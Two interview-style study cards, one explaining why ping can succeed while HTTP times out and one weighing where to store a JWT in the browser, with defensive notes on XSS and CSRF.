You can ping the server but HTTP times out. What's going on? WARM-UP
Ping uses ICMP; HTTP uses TCP port 80/443 — different protocols. So the host is up and routable, but: the web process is down, a firewall blocks the TCP port (while allowing ICMP), the port's wrong, or the TCP handshake/app is hanging. Reachability ≠ service availability.
Where should you store a JWT in the browser, and why? MEDIUM
There's no perfect spot. localStorage is easy but any XSS can steal the token. An HttpOnly cookie hides it from JS (better vs XSS) but is auto-sent, so you must add CSRF protection (SameSite + token). A common answer: short-lived access token in memory + a refresh token in an HttpOnly, SameSite cookie. The real fix is preventing XSS in the first place.
